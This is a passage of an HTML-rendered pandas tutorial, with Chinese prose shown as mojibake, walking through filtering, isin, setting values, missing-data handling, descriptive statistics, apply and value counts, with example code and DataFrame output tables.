data-language="python"><code class="language-python">df<span class="token punctuation">[</span>df <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">]</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-16</th>      <td>NaN</td>      <td>0.712521</td>      <td>0.743378</td>      <td>0.526823</td>    </tr>    <tr>      <th>2020-04-17</th>      <td>NaN</td>      <td>0.564346</td>      <td>NaN</td>      <td>0.080931</td>    </tr>    <tr>      <th>2020-04-18</th>      <td>NaN</td>      <td>2.046827</td>      <td>1.176614</td>      <td>NaN</td>    </tr>    <tr>      <th>2020-04-19</th>      <td>NaN</td>      <td>1.109991</td>      <td>NaN</td>      <td>1.068642</td>    </tr>    <tr>      <th>2020-04-20</th>      <td>NaN</td>      <td>1.351420</td>      <td>0.907865</td>      <td>NaN</td>    </tr>    <tr>      <th>2020-04-21</th>      <td>NaN</td>      <td>0.027143</td>      <td>NaN</td>      <td>NaN</td>    </tr>  </tbody></table></div><p>ä½¿ç”¨ <code>isin()</code> æ–¹æ³•æ¥è¿‡æ»¤æ•°æ®</p><p>(is in)</p><pre class="language-python" data-language="python"><code class="language-python">df3 <span class="token operator">=</span> df<span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token punctuation">)</span>df3<span class="token punctuation">[</span><span class="token string">'E'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'one'</span><span class="token punctuation">,</span> <span class="token string">'one'</span><span class="token punctuation">,</span><span class="token string">'two'</span><span class="token punctuation">,</span><span class="token string">'three'</span><span class="token punctuation">,</span><span class="token string">'four'</span><span class="token punctuation">,</span><span class="token string">'three'</span><span class="token punctuation">]</span>df3</code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>      <th>E</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-16</th>      <td>-0.228084</td>      <td>0.712521</td>      <td>0.743378</td>      <td>0.526823</td>      <td>one</td>    </tr>    <tr>      <th>2020-04-17</th>      <td>-0.423923</td>      <td>0.564346</td>      <td>-2.318931</td>      <td>0.080931</td>      <td>one</td>    </tr>    <tr>      <th>2020-04-18</th>      <td>-2.032243</td>      <td>2.046827</td>      <td>1.176614</td>      <td>-0.365556</td>      <td>two</td>    </tr>    <tr>      <th>2020-04-19</th>      <td>-1.200005</td>      <td>1.109991</td>      <td>-1.527804</td>      <td>1.068642</td>      <td>three</td>    </tr>    <tr>      <th>2020-04-20</th>      <td>-0.535031</td>      <td>1.351420</td>      <td>0.907865</td>      <td>-1.074013</td>      <td>four</td>    </tr>    <tr>      <th>2020-04-21</th>      <td>-0.614734</td>      <td>0.027143</td>      <td>-0.420875</td>      <td>-0.333819</td>      <td>three</td>    </tr>  </tbody></table></div><pre class="language-python" data-language="python"><code class="language-python">df3<span class="token punctuation">[</span>df3<span class="token punctuation">[</span><span class="token string">'E'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>isin<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'two'</span><span class="token punctuation">,</span><span class="token string">'four'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>      <th>E</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-18</th>      <td>-2.032243</td>      <td>2.046827</td>      <td>1.176614</td>      <td>-0.365556</td>      <td>two</td>    </tr>    <tr>      <th>2020-04-20</th>      <td>-0.535031</td>      <td>1.351420</td>      <td>0.907865</td>      <td>-1.074013</td>      <td>four</td>    </tr>  </tbody></table></div><h2 id="0x05-è®¾ç½®æ•°æ®-Setting"><a href="#0x05-è®¾ç½®æ•°æ®-Setting" class="headerlink" title="0x05 è®¾ç½®æ•°æ® Setting"></a>0x05 è®¾ç½®æ•°æ® Setting</h2><p>è®¾ç½®ä¸€ä¸ªæ–°çš„åˆ—ï¼Œè‡ªåŠ¨æŒ‰ç…§ç´¢å¼•æ¥å¯¹å…¶æ•°æ®</p><pre class="language-python" data-language="python"><code class="language-python">s1 <span class="token operator">=</span> pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span> index<span class="token operator">=</span>pd<span class="token punctuation">.</span>date_range<span class="token punctuation">(</span><span class="token string">'20200416'</span><span class="token punctuation">,</span> periods<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span>s1</code></pre><pre><code>2020-04-16    12020-04-17    22020-04-18    32020-04-19    42020-04-20    52020-04-21    6Freq: D, dtype: int64</code></pre><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">[</span><span class="token string">'F'</span><span class="token punctuation">]</span> <span class="token operator">=</span> s1</code></pre><p>é€šè¿‡æ ‡ç­¾è®¾ç½®æ–°çš„å€¼</p><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">.</span>at<span class="token punctuation">[</span>dates<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span></code></pre><p>é€šè¿‡æ ‡ç­¾è®¾ç½®æ–°çš„å€¼</p><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">.</span>iat<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span></code></pre><p>é€šè¿‡ä¸€ä¸ª numpy æ•°ç»„è®¾ç½®ä¸€ç»„æ–°å€¼</p><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">.</span>loc<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token string">'D'</span><span class="token punctuation">]</span> <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token builtin">len</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>ä¸Šè¿°æ“ä½œç»“æœå¦‚ä¸‹</p><pre class="language-python" data-language="python"><code class="language-python">df</code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>      <th>F</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-16</th>      <td>0.000000</td>      <td>0.000000</td>      <td>0.743378</td>      <td>5</td>      <td>1</td>    </tr>    <tr>      <th>2020-04-17</th>      <td>-0.423923</td>      <td>0.564346</td>      <td>-2.318931</td>      <td>5</td>      <td>2</td>    </tr>    <tr>      <th>2020-04-18</th>      <td>-2.032243</td>      <td>2.046827</td>      <td>1.176614</td>      <td>5</td>      <td>3</td>    </tr>    <tr>      <th>2020-04-19</th>      <td>-1.200005</td>      <td>1.109991</td>      <td>-1.527804</td>      <td>5</td>      <td>4</td>    </tr>    <tr>      <th>2020-04-20</th>      <td>-0.535031</td>      <td>1.351420</td>      <td>0.907865</td>      <td>5</td>      <td>5</td>    </tr>    <tr>      <th>2020-04-21</th>      <td>-0.614734</td>      <td>0.027143</td>      <td>-0.420875</td>      <td>5</td>      <td>6</td>    </tr>  </tbody></table></div><p>é€šè¿‡ where æ“ä½œæ¥è®¾ç½®æ–°çš„å€¼</p><pre class="language-python" data-language="python"><code class="language-python">df2 <span class="token operator">=</span> df<span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token punctuation">)</span>df2<span class="token punctuation">[</span>df2 <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span>df2df2</code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>      <th>F</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-16</th>      <td>0.000000</td>      <td>0.000000</td>      <td>-0.743378</td>      <td>-5</td>      <td>-1</td>    </tr>    <tr>      <th>2020-04-17</th>      <td>-0.423923</td>      <td>-0.564346</td>      <td>-2.318931</td>      <td>-5</td>      <td>-2</td>    </tr>    <tr>      <th>2020-04-18</th>      <td>-2.032243</td>      <td>-2.046827</td>      <td>-1.176614</td>      <td>-5</td>      <td>-3</td>    </tr>    <tr>      <th>2020-04-19</th>      <td>-1.200005</td>      <td>-1.109991</td>      <td>-1.527804</td>      <td>-5</td>      <td>-4</td>    </tr>    <tr>      <th>2020-04-20</th>      <td>-0.535031</td>      <td>-1.351420</td>      <td>-0.907865</td>      <td>-5</td>      <td>-5</td>    </tr>    <tr>      <th>2020-04-21</th>      <td>-0.614734</td>      <td>-0.027143</td>      <td>-0.420875</td>      <td>-5</td>      <td>-6</td>    </tr>  </tbody></table></div><h2 id="0x06-ç¼ºå¤±å€¼å¤„ç†-Missing-Data"><a href="#0x06-ç¼ºå¤±å€¼å¤„ç†-Missing-Data" class="headerlink" title="0x06 ç¼ºå¤±å€¼å¤„ç† Missing Data"></a>0x06 ç¼ºå¤±å€¼å¤„ç† Missing Data</h2><p>åœ¨pandasä¸­ï¼Œä½¿ç”¨<code>np.nan</code>æ¥ä»£æ›¿ç¼ºå¤±å€¼ï¼Œè¿™äº›å€¼å°†é»˜è®¤ä¸ä¼šåŒ…å«åœ¨è®¡ç®—ä¸­ã€‚</p><p><code>reindex()</code>æ–¹æ³•å¯ä»¥å¯¹æŒ‡å®šè½´ä¸Šçš„ç´¢å¼•è¿›è¡Œæ”¹å˜/å¢åŠ /åˆ é™¤æ“ä½œï¼Œè¿”å›åŸå§‹æ•°æ®çš„ä¸€ä¸ªæ‹·è´ã€‚</p><pre class="language-python" data-language="python"><code class="language-python">df1 <span class="token operator">=</span> df<span class="token punctuation">.</span>reindex<span class="token punctuation">(</span>index<span class="token operator">=</span>dates<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> columns<span class="token operator">=</span><span class="token builtin">list</span><span class="token punctuation">(</span>df<span class="token punctuation">.</span>columns<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token string">'E'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>df1</code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>      <th>F</th>      <th>E</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-16</th>      <td>0.000000</td>      <td>0.000000</td>      <td>0.743378</td>      <td>5</td>      <td>1</td>      <td>NaN</td>    </tr>    <tr>      <th>2020-04-17</th>      <td>-0.423923</td>      <td>0.564346</td>      <td>-2.318931</td>      <td>5</td>      <td>2</td>      <td>NaN</td>    </tr>    <tr>      <th>2020-04-18</th>      <td>-2.032243</td>      <td>2.046827</td>      <td>1.176614</td>      <td>5</td>      <td>3</td>      <td>NaN</td>    </tr>    <tr>      <th>2020-04-19</th>      <td>-1.200005</td>      <td>1.109991</td>      <td>-1.527804</td>      <td>5</td>      <td>4</td>      <td>NaN</td>    </tr>  </tbody></table></div><pre class="language-python" data-language="python"><code class="language-python">df1<span class="token punctuation">.</span>loc<span class="token punctuation">[</span>dates<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">:</span>dates<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'E'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>df1</code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>      <th>F</th>      <th>E</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-16</th>      <td>0.000000</td>      <td>0.000000</td>      <td>0.743378</td>      <td>5</td>      <td>1</td>      <td>1.0</td>    </tr>    <tr>      <th>2020-04-17</th>      <td>-0.423923</td>      <td>0.564346</td>      <td>-2.318931</td>      <td>5</td>      <td>2</td>      <td>1.0</td>    </tr>    <tr>      <th>2020-04-18</th>      <td>-2.032243</td>      <td>2.046827</td>      <td>1.176614</td>      <td>5</td>      <td>3</td>      <td>NaN</td>    </tr>    <tr>      <th>2020-04-19</th>      <td>-1.200005</td>      <td>1.109991</td>      <td>-1.527804</td>      <td>5</td>      <td>4</td>      <td>NaN</td>    </tr>  </tbody></table></div><p>å»æ‰åŒ…å«ç¼ºå¤±å€¼çš„è¡Œ</p><pre class="language-python" data-language="python"><code class="language-python">df1<span class="token punctuation">.</span>dropna<span class="token punctuation">(</span>how<span class="token operator">=</span><span class="token string">'any'</span><span class="token punctuation">)</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>      <th>F</th>      <th>E</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-16</th>      <td>0.000000</td>      <td>0.000000</td>      <td>0.743378</td>      <td>5</td>      <td>1</td>      <td>1.0</td>    </tr>    <tr>      <th>2020-04-17</th>      <td>-0.423923</td>      <td>0.564346</td>      <td>-2.318931</td>      <td>5</td>      <td>2</td>      <td>1.0</td>    </tr>  </tbody></table></div><p>å¡«å……ç¼ºå¤±çš„å€¼ï¼Œåˆ©ç”¨<code>value</code>æ¥æŒ‡å®š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span>df1<span class="token punctuation">)</span>df1<span class="token punctuation">.</span>fillna<span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span></code></pre><pre><code>                   A         B         C  D  F    E2020-04-16  0.000000  0.000000  0.743378  5  1  1.02020-04-17 -0.423923  0.564346 -2.318931  5  2  1.02020-04-18 -2.032243  2.046827  1.176614  5  3  NaN2020-04-19 -1.200005  1.109991 -1.527804  5  4  NaN</code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>      <th>F</th>      <th>E</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-16</th>      <td>0.000000</td>      <td>0.000000</td>      <td>0.743378</td>      <td>5</td>      <td>1</td>      <td>1.0</td>    </tr>    <tr>      <th>2020-04-17</th>      <td>-0.423923</td>      <td>0.564346</td>      <td>-2.318931</td>      <td>5</td>      <td>2</td>      <td>1.0</td>    </tr>    <tr>      <th>2020-04-18</th>      <td>-2.032243</td>      <td>2.046827</td>      <td>1.176614</td>      <td>5</td>      <td>3</td>      <td>5.0</td>    </tr>    <tr>      <th>2020-04-19</th>      <td>-1.200005</td>      <td>1.109991</td>      <td>-1.527804</td>      <td>5</td>      <td>4</td>      <td>5.0</td>    </tr>  </tbody></table></div><p>è·å–å€¼ä¸º<code>nan</code>çš„å¸ƒå°”å€¼(boolean mask)</p><pre class="language-python" data-language="python"><code class="language-python">pd<span class="token punctuation">.</span>isna<span class="token punctuation">(</span>df1<span class="token punctuation">)</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>      <th>F</th>      <th>E</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-16</th>      <td>False</td>      <td>False</td>      <td>False</td>      <td>False</td>      <td>False</td>      <td>False</td>    </tr>    <tr>      <th>2020-04-17</th>      <td>False</td>      <td>False</td>      <td>False</td>      <td>False</td>      <td>False</td>      <td>False</td>    </tr>    <tr>      <th>2020-04-18</th>      <td>False</td>      <td>False</td>      <td>False</td>      <td>False</td>      <td>False</td>      <td>True</td>    </tr>    <tr>      <th>2020-04-19</th>      <td>False</td>      <td>False</td>      <td>False</td>      <td>False</td>      <td>False</td>      <td>True</td>    </tr>  </tbody></table></div><h2 id="0x07-ä¸€äº›å¸¸ç”¨çš„æ“ä½œ-Operations"><a href="#0x07-ä¸€äº›å¸¸ç”¨çš„æ“ä½œ-Operations" class="headerlink" title="0x07 ä¸€äº›å¸¸ç”¨çš„æ“ä½œ Operations"></a>0x07 ä¸€äº›å¸¸ç”¨çš„æ“ä½œ Operations</h2><h3 id="0x07-1-ç»Ÿè®¡-Stats"><a href="#0x07-1-ç»Ÿè®¡-Stats" class="headerlink" title="0x07-1 ç»Ÿè®¡ Stats"></a>0x07-1 ç»Ÿè®¡ Stats</h3><p>è¿™äº›æ“ä½œ<strong>ä¸åŒ…æ‹¬ç¼ºå¤±æ•°æ®</strong></p><p>æ‰§è¡Œæè¿°æ€§ç»Ÿè®¡ï¼š</p><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">.</span>mean<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># å‡å€¼ï¼Œé»˜è®¤ä¸ºåˆ—çš„</span></code></pre><pre><code>A   -0.800989B    0.849955C   -0.239959D    5.000000F    3.500000dtype: float64</code></pre><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">.</span>mean<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># æŒ‡å®šåæ ‡è½´ï¼ˆæ­¤å¤„ä¸ºè¡Œï¼‰</span></code></pre><pre><code>2020-04-16    1.3486762020-04-17    0.9642992020-04-18    1.8382402020-04-19    1.4764362020-04-20    2.3448512020-04-21    1.998307Freq: D, dtype: float64</code></pre><p>å¯¹äºæ‹¥æœ‰ä¸åŒç»´åº¦ï¼Œéœ€è¦å¯¹é½å¯¹è±¡å†è¿›è¡Œæ“ä½œã€‚</p><p>Pandas ä¼šè‡ªåŠ¨çš„æ²¿ç€æŒ‡å®šçš„ç»´åº¦è¿›è¡Œå¹¿æ’­ã€‚</p><pre class="language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span>np<span class="token punctuation">.</span>nan<span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> index<span class="token operator">=</span>dates<span class="token punctuation">)</span><span class="token punctuation">.</span>shift<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>s</code></pre><pre><code>2020-04-16    NaN2020-04-17    NaN2020-04-18    1.02020-04-19    3.02020-04-20    5.02020-04-21    NaNFreq: D, dtype: float64</code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span>df<span class="token punctuation">.</span>sub<span class="token punctuation">(</span>s<span class="token punctuation">,</span> axis<span class="token operator">=</span><span class="token string">'index'</span><span class="token punctuation">)</span>  <span class="token comment"># df-s</span></code></pre><pre><code>                   A         B         C  D  F2020-04-16  0.000000  0.000000  0.743378  5  12020-04-17 -0.423923  0.564346 -2.318931  5  22020-04-18 -2.032243  2.046827  1.176614  5  32020-04-19 -1.200005  1.109991 -1.527804  5  42020-04-20 -0.535031  1.351420  0.907865  5  52020-04-21 -0.614734  0.027143 -0.420875  5  6</code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>      <th>F</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-16</th>      <td>NaN</td>      <td>NaN</td>      <td>NaN</td>      <td>NaN</td>      <td>NaN</td>    </tr>    <tr>      <th>2020-04-17</th>      <td>NaN</td>      <td>NaN</td>      <td>NaN</td>      <td>NaN</td>      <td>NaN</td>    </tr>    <tr>      <th>2020-04-18</th>      <td>-3.032243</td>      <td>1.046827</td>      <td>0.176614</td>      <td>4.0</td>      <td>2.0</td>    </tr>    <tr>      <th>2020-04-19</th>      <td>-4.200005</td>      <td>-1.890009</td>      <td>-4.527804</td>      <td>2.0</td>      <td>1.0</td>    </tr>    <tr>      <th>2020-04-20</th>      <td>-5.535031</td>      <td>-3.648580</td>      <td>-4.092135</td>      <td>0.0</td>      <td>0.0</td>    </tr>    <tr>      <th>2020-04-21</th>      <td>NaN</td>      <td>NaN</td>      <td>NaN</td>      <td>NaN</td>      <td>NaN</td>    </tr>  </tbody></table></div><h3 id="0x07-2-åº”ç”¨æ–¹æ³•åˆ°æ•°æ®-Apply"><a href="#0x07-2-åº”ç”¨æ–¹æ³•åˆ°æ•°æ®-Apply" class="headerlink" title="0x07-2 åº”ç”¨æ–¹æ³•åˆ°æ•°æ® Apply"></a>0x07-2 åº”ç”¨æ–¹æ³•åˆ°æ•°æ® Apply</h3><p>Applying functions to the data</p><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">.</span><span class="token builtin">apply</span><span class="token punctuation">(</span>np<span class="token punctuation">.</span>cumsum<span class="token punctuation">)</span>  <span class="token comment"># cumsum é»˜è®¤æŒ‰ç…§è¡Œç´¯åŠ </span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>      <th>F</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-16</th>      <td>0.000000</td>      <td>0.000000</td>      <td>0.743378</td>      <td>5</td>      <td>1</td>    </tr>    <tr>      <th>2020-04-17</th>      <td>-0.423923</td>      <td>0.564346</td>      <td>-1.575552</td>      <td>10</td>      <td>3</td>    </tr>    <tr>      <th>2020-04-18</th>      <td>-2.456166</td>      <td>2.611174</td>      <td>-0.398938</td>      <td>15</td>      <td>6</td>    </tr>    <tr>      <th>2020-04-19</th>      <td>-3.656170</td>      <td>3.721165</td>      <td>-1.926743</td>      <td>20</td>      <td>10</td>    </tr>    <tr>      <th>2020-04-20</th>      <td>-4.191201</td>      <td>5.072585</td>      <td>-1.018877</td>      <td>25</td>      <td>15</td>    </tr>    <tr>      <th>2020-04-21</th>      <td>-4.805935</td>      <td>5.099728</td>      <td>-1.439752</td>      <td>30</td>      <td>21</td>    </tr>  </tbody></table></div><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">.</span><span class="token builtin">apply</span><span class="token punctuation">(</span>np<span class="token punctuation">.</span>cumsum<span class="token punctuation">,</span>axis<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># æŒ‡å®š cumsum çš„ axis å‚æ•°ï¼ŒæŒ‰ç…§åˆ—ç´¯åŠ </span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>      <th>F</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-16</th>      <td>0.000000</td>      <td>0.000000</td>      <td>0.743378</td>      <td>5.743378</td>      <td>6.743378</td>    </tr>    <tr>      <th>2020-04-17</th>      <td>-0.423923</td>      <td>0.140424</td>      <td>-2.178507</td>      <td>2.821493</td>      <td>4.821493</td>    </tr>    <tr>      <th>2020-04-18</th>      <td>-2.032243</td>      <td>0.014584</td>      <td>1.191198</td>      <td>6.191198</td>      <td>9.191198</td>    </tr>    <tr>      <th>2020-04-19</th>      <td>-1.200005</td>      <td>-0.090013</td>      <td>-1.617818</td>      <td>3.382182</td>      <td>7.382182</td>    </tr>    <tr>      <th>2020-04-20</th>      <td>-0.535031</td>      <td>0.816389</td>      <td>1.724255</td>      <td>6.724255</td>      <td>11.724255</td>    </tr>    <tr>      <th>2020-04-21</th>      <td>-0.614734</td>      <td>-0.587591</td>      <td>-1.008466</td>      <td>3.991534</td>      <td>9.991534</td>    </tr>  </tbody></table></div><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">.</span><span class="token builtin">apply</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x<span class="token punctuation">.</span><span class="token builtin">max</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> x<span class="token punctuation">.</span><span class="token builtin">min</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><pre><code>A    2.032243B    2.046827C    3.495545D    0.000000F    5.000000dtype: float64</code></pre><h3 id="0x07-3-ç›´æ–¹å›¾-Histogramming"><a href="#0x07-3-ç›´æ–¹å›¾-Histogramming" class="headerlink" title="0x07-3 ç›´æ–¹å›¾ Histogramming"></a>0x07-3 ç›´æ–¹å›¾ Histogramming</h3><pre class="language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>s</code></pre><pre><code>0    01    42    53    04    35    26    27    08    59    1dtype: int32</code></pre><pre class="language-python" data-language="python"><code class="language-python">s<span class="token punctuation">.</span>value_counts<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><pre><code>0    35    22    24    13    11    1dtype: int64</code></pre><h3 id="0x07-4-å­—ç¬¦ä¸²æ–¹æ³•-String-Methods"><a href="#0x07-4-å­—ç¬¦ä¸²æ–¹æ³•-String-Methods" class="headerlink" title="0x07-4 å­—ç¬¦ä¸²æ–¹æ³• String Methods"></a>0x07-4 å­—ç¬¦ä¸²æ–¹æ³• String Methods</h3><p>Series åœ¨<code>str</code>å±æ€§ä¸­å‡†å¤‡äº†ä¸€ç»„å­—ç¬¦ä¸²å¤„ç†æ–¹æ³•ï¼Œå¯ä»¥æ–¹ä¾¿åœ°å¯¹æ•°ç»„çš„æ¯ä¸ªå…ƒç´ è¿›è¡Œæ“ä½œï¼Œå¦‚ä¸‹é¢çš„ä»£ç ç‰‡æ®µæ‰€ç¤ºã€‚</p><p>æ³¨æ„<code>str</code>ä¸­çš„æ¨¡å¼åŒ¹é…é€šå¸¸é»˜è®¤ä½¿ç”¨â€™<strong>æ­£åˆ™è¡¨è¾¾å¼</strong>ï¼ˆåœ¨æŸäº›æƒ…å†µä¸‹æ€»æ˜¯ä½¿ç”¨å®ƒä»¬ï¼‰ã€‚</p><pre 